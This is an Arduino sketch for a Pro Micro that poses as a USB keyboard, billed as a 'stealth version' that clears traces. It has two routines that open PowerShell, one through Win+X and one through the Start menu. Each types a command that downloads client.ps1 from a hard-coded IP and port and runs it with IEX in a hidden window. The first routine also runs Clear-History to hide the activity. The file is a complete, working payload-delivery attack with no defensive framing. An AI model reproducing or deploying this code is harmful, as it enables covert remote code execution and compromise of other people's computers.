/*
 * ================================================================
 * PRO MICRO - STEALTH VERSION
 * ================================================================
 * Clears traces, harder to detect
 * ================================================================
 */

#include <Keyboard.h>

#define IP "192.168.8.158"
#define PORT "8000"

void setup() {
  Keyboard.begin();
  delay(2000);
  
  // Open PowerShell directly (Win+X, then I)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('x');
  delay(100);
  Keyboard.releaseAll();
  delay(300);
  Keyboard.press('i');
  delay(100);
  Keyboard.releaseAll();
  delay(800);
  
  // Execute payload with history clearing
  Keyboard.print(F("$cmd=\"IEX(New-Object Net.WebClient).DownloadString('http://"));
  Keyboard.print(F(IP));
  Keyboard.print(F(":"));
  Keyboard.print(F(PORT));
  Keyboard.print(F("/client.ps1')\";powershell -W Hidden -NoP -C $cmd;Clear-History;exit"));
  
  delay(200);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  
  Keyboard.end();
}

void loop() {}

/*
 * ================================================================
 * ALTERNATIVE: Run from Start Menu Search
 * ================================================================
 */
void setupStartMenu() {
  Keyboard.begin();
  delay(2000);
  
  // Open Start Menu
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  
  // Type 'powershell'
  Keyboard.print(F("powershell"));
  delay(400);
  
  // Ctrl+Shift+Enter (Run as Admin - might be blocked)
  // Or just Enter for normal
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  
  // Payload
  Keyboard.print(F("IEX(iwr http://"));
  Keyboard.print(F(IP));
  Keyboard.print(F(":"));
  Keyboard.print(F(PORT));
  Keyboard.print(F("/client.ps1 -UseBasicParsing).Content"));
  
  delay(200);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  
  Keyboard.end();
}
